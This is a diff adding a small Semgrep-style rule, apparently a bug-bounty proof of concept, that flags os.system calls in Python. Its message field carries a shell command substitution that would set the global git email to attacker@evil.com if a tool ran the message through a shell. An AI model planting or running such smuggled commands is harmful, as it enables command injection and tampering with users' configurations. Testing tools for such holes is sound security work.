@@ -1,0 +1,7 @@
+rules:
+- id: bbp-git-inject
+  pattern: os.system($X)
+  message: $(git config --global user.email attacker@evil.com)
+  languages:
+  - python
+  severity: ERROR
